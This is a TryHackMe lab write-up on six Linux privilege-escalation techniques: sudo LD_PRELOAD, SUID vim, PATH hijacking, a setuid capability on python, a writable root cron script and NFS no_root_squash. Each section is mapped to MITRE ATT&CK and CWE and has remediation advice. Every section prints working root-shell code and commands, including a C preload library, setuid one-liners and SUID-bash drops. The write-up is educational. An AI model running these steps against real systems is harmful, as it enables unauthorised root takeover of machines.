# TryHackMe — Linux Privilege Escalation: Basics

> **Room:** `linprivbasics` · **Category:** Linux Privilege Escalation · **Difficulty:** Easy (theory + practice)
> **Author writeup by:** nos010101 · **Date:** 2026-10
> **Scope:** Six local privilege-escalation primitives, each drilled on its own practice box. Mechanism-first, mapped to MITRE ATT&CK / CWE / GTFOBins.

> ⚠️ **Flags are partially redacted** in this public copy to avoid leaking answers. Format is preserved; the solving portion is masked (`█`).

---

## Table of Contents

1. [Methodology & Diagnostic Reflex](#methodology)
2. [Class 1 — sudo misconfig: `LD_PRELOAD`](#class-1)
3. [Class 2 — SUID binary](#class-2)
4. [Class 3 — PATH hijacking](#class-3)
5. [Class 4 — Linux capabilities](#class-4)
6. [Class 5 — Cron jobs](#class-5)
7. [Class 6 — NFS `no_root_squash`](#class-6)
8. [Unifying Root Cause](#root-cause)
9. [Lessons Learned](#lessons)
10. [Standards Mapping Summary](#mapping)

---

<a name="methodology"></a>
## 1. Methodology & Diagnostic Reflex

All six classes share one root defect: **an excess privilege attached to a binary, config, or scheduled job, which an unprivileged user crosses as a trust boundary** (CWE-250, *Execution with Unnecessary Privileges*). The attack is never "break the privilege mechanism" — the mechanism works as designed; the flaw is that the privilege was granted where it wasn't needed, or guarded loosely.

The enumeration chain drilled across the room:

```bash
sudo -l                                            # delegated-command misconfig
find / -type f -perm -4000 2>/dev/null | grep -v snap   # SUID binaries (strip snap noise)
getcap -r / 2>/dev/null                            # capabilities (INVISIBLE to find -perm)
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*/ # scheduled jobs
cat /etc/exports; showmount -e <target>            # NFS exports
```

Per-anomaly follow-up: `strings <binary> | grep -iE 'system|exec|popen'` to spot bare-name command calls, then cross-reference **GTFOBins**. Always check file **permissions before choosing a payload** — the permission bits decide which of several candidate vectors is actually live.

**Meta-note on room design (recurring confusion, cleared):** the room *description* shows the admin **creating** the vulnerability (prompt `root@box:~#`, e.g. `gcc … -o program && chmod u+s program`). Those are **not** attacker steps. The vulnerable artifact is a **ready-made given** on the box; the attacker only plants a payload and triggers/waits.

---

<a name="class-1"></a>
## 2. Class 1 — sudo misconfig: `LD_PRELOAD`

**Flag:** `THM{SUDO-█████████████-████}`
**ATT&CK:** T1548.003 (Sudo abuse) → T1574.006 (Dynamic Linker Hijacking) · **CWE-426** · **GTFOBins:** `sudo` / `LD_PRELOAD`

### Mechanism

The dynamic loader (`ld.so`) honours `LD_PRELOAD` to load an attacker `.so` **before libc**, and runs its `__attribute__((constructor))` function **before `main()`**. glibc normally strips `LD_PRELOAD` for SUID binaries via `AT_SECURE` (secure-execution mode). Sudo defeats this: it authenticates, elevates to root, then `execve()`s the target as a **non-setuid root child** — `AT_SECURE` is not set, so the loader honours a passed `LD_PRELOAD`. The gate is a sudoers line keeping the variable through `env_reset`.

### Enumeration

```
env_reset, env_keep+=LD_PRELOAD
User john may run: (ALL) NOPASSWD: /usr/bin/nano, /usr/sbin/apache2
```

### Exploitation

```c
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) pwn(void) {
    unsetenv("LD_PRELOAD");          // stop respawn recursion
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles   # compile ON TARGET (glibc ABI match)
sudo LD_PRELOAD=/tmp/x.so apache2                        # any whitelisted command
```

**GOTCHA:** `sudo find` failed first — `find` was not in the whitelist, so sudo rejected it at policy-check **before** the environment ever reached the loader. A password prompt under an expected `NOPASSWD` = early signal the command missed the matching rule.

**Second vector, same sudoers line:** `nano` is whitelisted → direct GTFOBins escape (`^R^X`, `reset; sh 1>&0 2>&0`), no compiler needed. One misconfig, two paths.

---

<a name="class-2"></a>
## 3. Class 2 — SUID binary

**Flag:** `THM{root-by-████-█████}`
**ATT&CK:** T1548.001 (Setuid/Setgid) · **CWE-250 / CWE-732** · **GTFOBins:** `vim` / SUID

### Mechanism

The SUID bit makes a process run with the **effective UID of the file owner**, not the launcher. Legitimate for `passwd` (must write `/etc/shadow`). Dangerous when the SUID binary offers a **general-purpose primitive** (read/write/exec) the author never meant to expose at root.

### Enumeration

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Anomaly-spotting principle: **mentally strike out all `/snap/` read-only images and the distro baseline** (`passwd`, `su`, `mount`, `sudo`, `chfn`, `chsh`, `gpasswd`, `newgrp`, `ssh-keysign`, `polkit-agent-helper-1`, `snap-confine`). What remains is the vector. Criterion is **path + deviation from baseline**, NOT file size:

```
-rwsr-xr-x 1 root root 4126400 /usr/bin/vim.basic   ← vim is NOT SUID by default = anomaly
```

### Exploitation

```bash
/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
```

`os.setuid(0)` raises the real UID to 0 (plain `:!/bin/sh` keeps ruid=john and many shells drop euid→ruid). SUID-vim is also a direct read primitive (`:e /root/root.txt`) and write primitive (edit `/etc/passwd`).

---

<a name="class-3"></a>
## 4. Class 3 — PATH hijacking

**Flag:** `THM{PATH-███-████-leadtoroot}`
**ATT&CK:** T1574.007 (Path Interception by PATH) · **CWE-426 / CWE-427** · **GTFOBins:** `<custom binary>`

### Mechanism

A command invoked **by bare name** (no slash) is resolved left-to-right through `PATH`; the first match wins. If a privileged consumer (SUID binary / root cron / service) resolves a bare-name command via a `PATH` the attacker controls, the attacker's binary runs with the consumer's privilege.

> **Key correction:** you can **always** change your own `PATH` — it's your process's variable. What is "closed" in production is not PATH-editing but the **presence of a privileged consumer** that resolves bare names via your PATH. Defence lives on the consumer side: absolute paths, PATH reset, or sudo `secure_path`.

### Enumeration

```bash
find / -type f -perm -4000 2>/dev/null | grep -v /snap/
# → /opt/path/mywhoami   (custom path, non-distro name = anomaly)
strings /opt/path/mywhoami | grep -iE 'whoami|system'
# → system  /  whoami    (bare name, no /usr/bin/ prefix = PATH-hijack confirmed)
```

### Exploitation

```bash
echo '/bin/bash -p' > /tmp/whoami
chmod +x /tmp/whoami
export PATH=/tmp:$PATH
/opt/path/mywhoami            # runs as root → system("whoami") → finds /tmp/whoami first → root
```

**Role clarification:** the admin compiled & `chmod u+s`'d the binary (owner root) beforehand. A SUID binary the attacker compiles themselves is owned by the attacker → euid = attacker → useless. You exploit the *existing* root-owned binary; you only plant the replacement command.

---

<a name="class-4"></a>
## 5. Class 4 — Linux capabilities

**Flag:** `THM{caps_██████_r00T}`
**ATT&CK:** T1548.001 · **CWE-250 / CWE-732** · **GTFOBins:** `python` / Capabilities

### Mechanism

Capabilities slice monolithic root into ~40 independent fragments, so a binary can hold exactly one privilege instead of full root (e.g. `ping` carries `cap_net_raw` instead of SUID). The suffix `=ep` = **Effective + Permitted** (active immediately on exec). **Capabilities are invisible to `ls -l` and to `find -perm -4000`** — a dedicated `getcap -r /` is mandatory, or `cap_setuid` stays a blind spot.

### Enumeration

```bash
getcap -r / 2>/dev/null
```

| Entry | Verdict |
|---|---|
| `ping`, `mtr-packet` → `cap_net_raw=ep` | baseline — raw sockets, no root path |
| `gst-ptp-helper → cap_net_bind_service,cap_net_admin,cap_sys_nice=ep` | background noise |
| **`/usr/bin/python3.12 cap_setuid=ep`** | **JACKPOT — direct root** |

`cap_setuid` = permission to call `setuid()` to any UID including 0. On a general-purpose interpreter = instant root.

### Exploitation

```bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

No `-p` needed: `os.setuid(0)` sets the **real** UID to 0, so bash has nothing to drop.

**Dangerous-capability cheat sheet:** `cap_setuid` (direct), `cap_dac_read_search` (read any file → shadow/keys), `cap_dac_override` (write any file → passwd/sudoers), `cap_sys_module` (load kernel module), `cap_sys_admin` / `cap_sys_ptrace` / `cap_chown`. Harmless: `cap_net_raw`, `cap_net_bind_service`. The carrier that turns a cap into root is an **interpreter or file-primitive** (python/perl/ruby/node/gdb/tar/vim).

---

<a name="class-5"></a>
## 6. Class 5 — Cron jobs

**Flag:** `THM{g0t-r00t-from-████}`
**ATT&CK:** T1053.003 (Scheduled Task/Job: Cron) · **CWE-732** (writable script) / **CWE-426** (PATH variant)

### Mechanism

Cron runs jobs **as a specified user (often root), on schedule, automatically**. Unlike the previous classes, **the trigger is time, not the attacker** — plant the payload, then wait. System crontab (`/etc/crontab`, `/etc/cron.d/*`) has an extra **user-name field** the user crontab lacks.

### Enumeration

`/etc/crontab` was the stock Debian/Ubuntu default (four `run-parts` jobs) — baseline, not a vector. The custom job lived in `/etc/cron.d/cleanup`:

```
SHELL=/bin/bash
PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/local/bin/cleanup.sh
```

`cleanup.sh` calls `find` by **bare name**. Two candidate vectors:

- **Vector A — writable script:** overwrite `cleanup.sh` directly.
- **Vector B — PATH hijack:** the cron line sets `PATH` with `/home/ubuntu` **first**; the script inherits this env as cron's child process, so its bare `find` resolves there first. Plant `/home/ubuntu/find`.

> **Where `/home/ubuntu` enters PATH:** NOT in the script. The `PATH=` line is in the **cron job** (`/etc/cron.d/cleanup`). Cron sets it for the job's environment; `cleanup.sh`, launched as cron's **child process, inherits the environment** (incl. PATH) automatically. Same inheritance as `export PATH=/tmp:$PATH` → launched binary sees it.

**Permissions decide which vector is live:**

```
-rwxrwxrwx 1 root root  /usr/local/bin/cleanup.sh   ← world-writable → Vector A LIVE
drwxr-xr-x 5 ubuntu ubuntu /home/ubuntu             ← not writable by john → Vector B DEAD
```

### Exploitation (Vector A)

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/cleanup.sh
# wait ≤60s (job is * * * * *)
ls -la /tmp/rootbash        # -rwsr-sr-x 1 root root  (cron ran the cp/chmod as root)
/tmp/rootbash -p            # euid=0 → root
```

`>>` (append) preserves the legitimate job. **SUID-bash drop preferred over reverse shell** — pull-free, survives egress firewalls. First `ls` returned "No such file" simply because cron hadn't fired yet (trigger = time): don't mistake an empty result for a bad payload.

---

<a name="class-6"></a>
## 7. Class 6 — NFS `no_root_squash`

**Flag:** `THM{exports-████-███}`
**ATT&CK:** T1080 (Taint Shared Content) + T1548.001 (SUID carrier) · **CWE-732 / CWE-250**

### Mechanism

NFS (v3) identifies users by **numeric UID**, not name — a client write arrives tagged with the client's UID, applied as that UID on the server. Default protection **`root_squash`** maps an incoming UID 0 to `nobody` (65534): "root on the client ≠ root on the server." **`no_root_squash` disables this** — client UID 0 stays UID 0 on the server.

This is the room's first **two-machine** privesc. The "bridge" is **not a network execution channel — it is the file itself on the server's disk**:

- **Delivery phase** (network, Kali-root, NFS): write a root-owned SUID file onto the server. Only possible because `no_root_squash` preserves your Kali-root's UID 0 — something the unprivileged john on the server cannot do himself.
- **Execution phase** (local, server, john): run that file; standard local SUID gives euid=0.

The server (`10.146.163.129`) **is** john's box — "NFS server" is a role, not a third machine. `/mnt/nfs` on Kali and `/opt/nfs` on the server are the **same directory** viewed from two sides.

### Enumeration

```
# cat /etc/exports
/opt/nfs  *(rw,sync,no_root_squash,no_subtree_check)
# showmount -e 10.146.163.129
/opt/nfs *
```

`rw` + `no_root_squash` + `*` (any host) = full condition set.

### Exploitation

```bash
# On Kali (as root):
mkdir /mnt/nfs
mount -t nfs 10.146.163.129:/opt/nfs /mnt/nfs   # add -o vers=3 if v4 idmap maps owner to nobody
cp /bin/bash /mnt/nfs/rootbash                   # owner=root (you are root on Kali)
chmod +s /mnt/nfs/rootbash

# On the server (as john):
/opt/nfs/rootbash -p
```

Result `id`: `uid=1001(john) euid=0(root)` — textbook SUID: real UID = launcher (john), effective UID = file owner (root); kernel checks euid → root file access.

> **What `rootbash` is:** literally a copy of `/bin/bash`. It grants root only because its two metadata attributes are owner=root **and** SUID-bit set. The same program owned by john, or without the SUID bit, grants nothing. `-p` is required or bash drops euid back to john on startup.

**Same SUID mechanism as `vim.basic` / `mywhoami`** — the only difference is *where the root-owned SUID file came from*: the admin pre-placed those; here **you created it yourself** through the broken NFS export. NFS lives only in the delivery phase.

---

<a name="root-cause"></a>
## 8. Unifying Root Cause

| # | Class | Carrier of privilege | ATT&CK | Flag |
|---|---|---|---|---|
| 1 | sudo misconfig | `env_keep+=LD_PRELOAD` sudoers line | T1548.003→T1574.006 | `THM{SUDO-█…}` |
| 2 | SUID binary | SUID bit on `vim.basic` | T1548.001 | `THM{root-by-█…}` |
| 3 | PATH hijack | SUID binary calling bare-name cmd | T1574.007 | `THM{PATH-█…}` |
| 4 | capabilities | `cap_setuid=ep` on `python3.12` | T1548.001 | `THM{caps_█…}` |
| 5 | cron | world-writable root-cron script | T1053.003 | `THM{g0t-r00t-█…}` |
| 6 | NFS | `no_root_squash` export (write channel) | T1080+T1548.001 | `THM{exports-█…}` |

Six different carriers (sudoers line, SUID bit, PATH resolution, file capability, cron job, NFS export), **one root cause: CWE-250 — excessive privilege crossed as a trust boundary.**

---

<a name="lessons"></a>
## 9. Lessons Learned

1. **Trigger model differs.** Classes 1–4 are *attacker-triggered* (you launch the privileged binary). Cron is *time-triggered* (root comes to you — plant & wait). NFS is *two-machine* (create on Kali, execute on server).
2. **Capabilities are a blind spot** for SUID enumeration. Always run `getcap -r /` separately.
3. **Anomaly = path + baseline deviation, not size.** `vim.basic` being large was coincidence; `find`/`cp`/`bash` as SUID are small and equally lethal. Strike out `/snap/` + distro baseline, cross-check GTFOBins.
4. **Check permissions before choosing a payload.** On the cron box, `ls -la` decided Vector A (writable script) vs dead Vector B (non-writable dir). Guessing wastes the window.
5. **PATH is always editable; the consumer is what's hardened.** The vector lives in custom `/opt/` SUID software, root cron scripts, and services resolving bare names.
6. **Prefer SUID-bash drop over reverse shell** for cron/NFS payloads — pull-free, survives egress filtering (relevant to financial-sector targets where outbound is usually filtered).
7. **Role confusion cleared:** room descriptions show the *admin creating* the vuln (`root@` prompt, `gcc`/`chmod u+s`). The vulnerable artifact is a given; the attacker plants a payload and triggers.
8. **NFS carries two defect classes** — information disclosure (world-readable export) **and** privileged write (`no_root_squash`+`rw`). On sight of NFS, check *both* what's readable and the export options.

---

<a name="mapping"></a>
## 10. Standards Mapping Summary

**MITRE ATT&CK:** T1548.001, T1548.003, T1574.006, T1574.007, T1053.003, T1080
**CWE:** CWE-250 (root cause), CWE-426, CWE-427, CWE-732
**GTFOBins:** `sudo`/`LD_PRELOAD`, `vim`, `python`, custom-binary PATH hijack
**NIST 800-115:** misconfiguration findings surfaced during service/host enumeration

### Remediation (audit language)

| Class | Fix |
|---|---|
| sudo `LD_PRELOAD` | Remove `env_keep+=LD_PRELOAD`; keep `env_reset` default |
| SUID | Strip unnecessary SUID bit; audit against distro baseline |
| PATH hijack | Invoke commands by absolute path; reset PATH in privileged code; sudo `secure_path` |
| capabilities | `setcap -r` on system interpreters; grant caps only to dedicated restricted copies |
| cron | Script perms `root:root 755`; absolute paths; no home dirs in root PATH |
| NFS | Restore `root_squash`; restrict export by subnet (not `*`); consider `all_squash` + `sec=krb5` (replace trust-the-client-UID `sec=sys`) |

---

*Writeup produced for educational and portfolio purposes. All testing performed in authorised TryHackMe lab environments.*
